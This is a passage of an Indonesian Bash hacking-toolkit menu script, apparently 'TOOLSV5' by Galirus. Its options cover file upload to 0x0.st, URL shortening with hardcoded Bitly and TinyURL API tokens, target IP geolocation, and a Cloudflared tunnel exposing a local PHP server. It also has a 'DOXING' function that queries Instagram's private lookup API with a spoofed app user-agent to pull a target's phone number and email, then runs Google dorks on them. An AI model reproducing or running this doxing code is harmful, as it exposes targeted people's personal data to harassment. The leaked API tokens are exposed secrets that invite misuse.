⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⡴⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⠿⠿⠛⠛⠛⠋⠉⠉⠉⠛⠛⠛⠛⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠿⠿⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣠⣤⠴⠖⠋⢉⣽⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⡀
⠀⠀⢠⣿⠟⠉⠁⠈⠉⠉⠙⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⢠⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠽⠟⠛⠉⠀⢀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣷⣶⣦⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⠘⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣴⣿⣿⣄⠀⠀⠀⠀⠀⣀⣠⣴⠶⣿⣿⠋⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀⣀⣴⣶⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡍⠛⠻⢷⣶⣶⣶⠟⢿⣿⠗⠀⠹⠃⡀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⠀⠀⠀⢻⣿⣿⠀⠈⠛⠀⠀⠀⢹⠇⠀⠀⠀⠀⢶⣿⠇⠀⢀⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⣀⡾⠀⠀⠀⠀⠀⢸⡿⠀⣠⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⣦⠀⠀⢠⣿⢳⠀⠀⠀⠙⣿⣿⠁⢰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⡾⠿⠃⢸⣷⣀⠀⢀⣾⠃⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠻⠷⢾⣿⣿⣷⡿⠁⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣷⣄⠀⠀⠉⠛⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⣄⡀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣶⣶⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[   UPLOADING FILE V.1.0.0 BETA   ]
⠀    ⠀ ⠀⠀[⠀ DEVELOPMENT BY GALIRUS OFFICIAL⠀⠀]⠀⠀
⠀⠀⠀⠀
"
}
upload_file() {
local file="$1"
if [ ! -f "$file" ]; then
echo -e "${YELLOW}File tidak ditemukan:$NC $file"
return
fi
clear
banner | lolcat
echo -e "${YELLOW}Uploading:$NC $file ..."
local response=$(curl -sf -F "file=@$file" https://0x0.st)
if [ $? -eq 0 ]; then
clear
banner | lolcat
echo -e "${GREEN}Upload sukses!$NC"
URLS+=("$response")
else
echo -e "${YELLOW}Upload gagal untuk file:$NC $file"
fi
}
while true; do
clear
banner | lolcat
IFS= read -r -e -p "Masukkan jalur file: " filepath
upload_file "$filepath"
IFS= read -r -e -p "Apakah anda ingin menambahkan file lagi? (y/n): " add_more
if [[ $add_more != "y" && $add_more != "Y" ]]; then
break
fi
done
clear
banner | lolcat
echo -e "\n${GREEN}Daftar URL hasil upload:$NC"
for url in "${URLS[@]}"; do
echo "$url"
done
echo
echo
echo
IFS= read -r -e -p "Silahkan Enter Untuk Kembali ke TOOLSV5"
elif [ "$no" = "24" ]; then
clear
banner2 | lolcat
e "${ran}"
IFS= read -r -e -p "Silahkan Masukkan Url / Link : " LONG_URL
BITLY_TOKEN="b39549e89f08923d7faef0b53e65d77cff589410"
TINYURL_TOKEN="RbcrFbz7N6T67JdGeUVBMbrYylHDQYXyyrDK4mMefuYp0mHccX9gFX7WEEHw"
CUTTLY_API_KEY="${shortlink}"
e "$h Memendekkan URL$k: ${white}$LONG_URL${res}\n"
e "$b[1] Bitly${res}"
bitly_response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
-H "Authorization: Bearer $BITLY_TOKEN" \
-H "Content-Type: application/json" \
-d "{\"long_url\": \"$LONG_URL\"}")
bitly_link=$(echo "$bitly_response" | grep -oP '"link":\s*"\K[^"]+')
e "   🔗 ${h}Shortlink:${res} $bitly_link\n"
e "${b}[2] TinyURL${reset}"
tinyurl_response=$(curl -s -X POST "https://api.tinyurl.com/create" \
-H "Authorization: Bearer $TINYURL_TOKEN" \
-H "Content-Type: application/json" \
-d "{\"url\": \"$LONG_URL\"}")
tinyurl_link=$(echo "$tinyurl_response" | grep -oP '"tiny_url":\s*"\K[^"]+' | sed 's#\\##g')
e "   🔗 ${h}Shortlink:${res} $tinyurl_link\n"
e "${b}[3] Cutt.ly${reset}"
cuttly_response=$(curl -s -G "https://cutt.ly/api/api.php" \
--data-urlencode "key=$CUTTLY_API_KEY" \
--data-urlencode "short=$LONG_URL")
cuttly_link=$(echo "$cuttly_response" | grep -oP '"shortLink":\s*"\K[^"]+' | sed 's#\\##g')
e "   🔗 ${g}Shortlink:${res} $cuttly_link\n"
e "${bl}🎉 URL berhasil dipendekkan menggunakan 3 layanan!${res}"
ENTER
elif [ "$no" = "25" ]; then
clear
text="SUBSCRIBE GALIRUS OFFICIAL YOUTUBE"
duration=10
length=${#text}
steps=100
sleep_time=0.1
function loading_effect() {
start_time=$(date +%s)
while true; do
for ((i = 0; i <= length; i++)); do
echo -ne "\r${text:0:i}$(echo "${text:i}" | tr '[:upper:]' '[:lower:]')"
sleep "$sleep_time"
current_time=$(date +%s)
elapsed_time=$((current_time - start_time))
if [ "$elapsed_time" -ge "$duration" ]; then
xdg-open "https://www.youtube.com/@GalirusProjects"
break 2
fi
done
done
echo -ne "\r$text"
echo ""
}
e "$h"
loading_effect
banner1() {
echo "
You
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀Animex⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇"
}
banner2() {
cowsay -f eyes "Simpel Check IP By.Galirus404" | lolcat
}
banner3() {
echo "
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Simpel Check IP By.Galirus404⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
logo=("banner1" "banner2" "banner3")
random_index=$((RANDOM % ${#logo[@]}))
banner="${logo[random_index]}"
clear
$banner | lolcat
track_ip_address() {
IFS= read -r -e -p "Masukkan IP target: " IP
echo
e "${p}============= ${h}SHOW INFORMATION IP ADDRESS ${p}============="
ip_data=$(curl -s "http://ipwho.is/$IP")
success=$(echo "$ip_data" | jq -r '.success')
if [[ "$success" == "false" ]]; then
message=$(echo "$ip_data" | jq -r '.message')
e "${m}Error:${h} $message"
return
fi
type=$(echo "$ip_data" | jq -r '.type // "N/A"')
country=$(echo "$ip_data" | jq -r '.country // "N/A"')
country_code=$(echo "$ip_data" | jq -r '.country_code // "N/A"')
city=$(echo "$ip_data" | jq -r '.city // "N/A"')
continent=$(echo "$ip_data" | jq -r '.continent // "N/A"')
continent_code=$(echo "$ip_data" | jq -r '.continent_code // "N/A"')
region=$(echo "$ip_data" | jq -r '.region // "N/A"')
region_code=$(echo "$ip_data" | jq -r '.region_code // "N/A"')
latitude=$(echo "$ip_data" | jq -r '.latitude // "N/A"')
longitude=$(echo "$ip_data" | jq -r '.longitude // "N/A"')
is_eu=$(echo "$ip_data" | jq -r '.is_eu // "N/A"')
postal=$(echo "$ip_data" | jq -r '.postal // "N/A"')
calling_code=$(echo "$ip_data" | jq -r '.calling_code // "N/A"')
capital=$(echo "$ip_data" | jq -r '.capital // "N/A"')
borders=$(echo "$ip_data" | jq -r '.borders // "N/A"')
flag=$(echo "$ip_data" | jq -r '.flag.emoji // "N/A"')
asn=$(echo "$ip_data" | jq -r '.connection.asn // "N/A"')
org=$(echo "$ip_data" | jq -r '.connection.org // "N/A"')
isp=$(echo "$ip_data" | jq -r '.connection.isp // "N/A"')
domain=$(echo "$ip_data" | jq -r '.connection.domain // "N/A"')
tz_id=$(echo "$ip_data" | jq -r '.timezone.id // "N/A"')
tz_abbr=$(echo "$ip_data" | jq -r '.timezone.abbr // "N/A"')
tz_is_dst=$(echo "$ip_data" | jq -r '.timezone.is_dst // "N/A"')
tz_offset=$(echo "$ip_data" | jq -r '.timezone.offset // "N/A"')
tz_utc=$(echo "$ip_data" | jq -r '.timezone.utc // "N/A"')
tz_current_time=$(echo "$ip_data" | jq -r '.timezone.current_time // "N/A"')
e "${p}IP target       : ${h}$IP"
e "${p}Type IP         : ${h}$type"
e "${p}Country         : ${h}$country"
e "${p}Country Code    : ${h}$country_code"
e "${p}City            : ${h}$city"
e "${p}Continent       : ${h}$continent"
e "${p}Continent Code  : ${h}$continent_code"
e "${p}Region          : ${h}$region"
e "${p}Region Code     : ${h}$region_code"
e "${p}Latitude        : ${h}$latitude"
e "${p}Longitude       : ${h}$longitude"
e "${p}Maps            : ${h}https://www.google.com/maps/@${latitude},${longitude},8z"
e "${p}EU              : ${h}$is_eu"
e "${p}Postal          : ${h}$postal"
e "${p}Calling Code    : ${h}$calling_code"
e "${p}Capital         : ${h}$capital"
e "${p}Borders         : ${h}$borders"
e "${p}Country Flag    : ${h}$flag"
e "${p}ASN             : ${h}$asn"
e "${p}ORG             : ${h}$org"
e "${p}ISP             : ${h}$isp"
e "${p}Domain          : ${h}$domain"
e "${p}Timezone ID     : ${h}$tz_id"
e "${p}Timezone ABBR   : ${h}$tz_abbr"
e "${p}DST             : ${h}$tz_is_dst"
e "${p}Offset          : ${h}$tz_offset"
e "${p}UTC             : ${h}$tz_utc"
e "${p}Current Time    : ${h}$tz_current_time"
}
track_ip_address
IFS= read -r -e -p "Tekan Enter untuk melanjutkan..."
elif [ "$no" = "26" ]; then
logo() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
cloud() {
IFS= read -r -e -p "Masukkan Port Yang Ingin Anda Gunakan : " apa
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflared...\e[0m\n"
php -S localhost:$apa > /dev/null 2>&1 &
sleep 3
cloudflared tunnel --url http://localhost:$apa --protocol http2 > sendlink 2>&1 &
sleep 8
send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Silahkan Salin Link:\e[0m\e[1;77m %s\n' $send_link
}
clear
logo | lolcat
echo -e $pwl " Cloudflared Link By.Galirus Official"
cloud
ENTER
elif [ "$no" = "27" ]; then
dox() {
MERAH='\033[1;31m'
HIJAU='\033[1;32m'
KUNING='\033[1;33m'
BIRU='\033[1;34m'
SIAU='\033[1;36m'
PUTIH='\033[1;37m'
MAGENTA='\033[1;35m'
NC='\033[0m'
clear
banner() {
echo -e "${MERAH}
██████╗  ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗
██╔══██╗██╔═══██╗╚██╗██╔╝██║████╗  ██║██╔════╝
██║  ██║██║   ██║ ╚███╔╝ ██║██╔██╗ ██║██║  ███╗
██║  ██║██║   ██║ ██╔██╗ ██║██║╚██╗██║██║   ██║
██████╔╝╚██████╔╝██╔╝ ██╗██║██║ ╚████║╚██████╔╝
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
[ GALIRUS X TOOLSV5 ]"
}
banner
echo -e "${NC}"
INSTAGRAM_API_URL="https://i.instagram.com/api/v1/users/lookup/"
ambil_informasi_instagram() {
local username=$1
echo -e "${PUTIH}[${HIJAU}+${PUTIH}] Target username: ${username}${NC}"
echo -e "${PUTIH}[${HIJAU}+${PUTIH}] Mengambil informasi pengguna Instagram...${NC}"
response=$(curl -s -X POST "$INSTAGRAM_API_URL" \
-H "accept-language: en-US;q=1.0" \
-H "content-type: application/x-www-form-urlencoded; charset=UTF-8" \
-H "user-agent: Instagram 337.0.3.23.54 (iPhone12,1; iOS 16_6; en_US; en; scale=2.00; 828x1792; 577210397) AppleWebKit/420+" \
-d "q=${username}" 2> /dev/null)
echo -e "${SIAU}--- INFORMASI INSTAGRAM ---${NC}"
if [ $? -eq 0 ] && [ ! -z "$response" ]; then
phone_number=$(echo "$response" | grep -o '"phone_number":"[^"]*"' | cut -d'"' -f4)
email=$(echo "$response" | grep -o '"email":"[^"]*"' | cut -d'"' -f4)
user_id=$(echo "$response" | grep -o '"user_id":"[^"]*"' | cut -d'"' -f4)
phone_number=${phone_number:-"Tidak tersedia"}
email=${email:-"Tidak tersedia"}
user_id=${user_id:-"Tidak tersedia"}
echo -e "${PUTIH}Username           : ${HIJAU}${username}${NC}"
echo -e "${PUTIH}ID Pengguna        : ${HIJAU}${user_id}${NC}"
echo -e "${PUTIH}Nomor Telepon      : ${HIJAU}${phone_number}${NC}"
echo -e "${PUTIH}Email              : ${HIJAU}${email}${NC}"
return 0
else
echo -e "${MERAH}[!] Gagal mengambil informasi Instagram untuk ${username}${NC}"
return 1
fi
}
pencarian_google_dork() {
local username=$1
echo -e "${PUTIH}[${HIJAU}+${PUTIH}] Melakukan pencarian Google dork...${NC}"
echo -e "${SIAU}--- HASIL PENCARIAN GOOGLE DORK ---${NC}"
searches=(
"site:instagram.com intext:${username}"
"\"${username}\" site:instagram.com"
"\"${username}\" profil instagram"
"\"${username}\" akun instagram"
"\"${username}\" site:facebook.com"
"\"${username}\" site:twitter.com"
"\"${username}\" site:tiktok.com"
)
echo -e "${PUTIH}Target: ${HIJAU}${username}${NC}"
echo -e "${PUTIH}Waktu Pencarian: ${HIJAU}$(date)${NC}"
echo ""
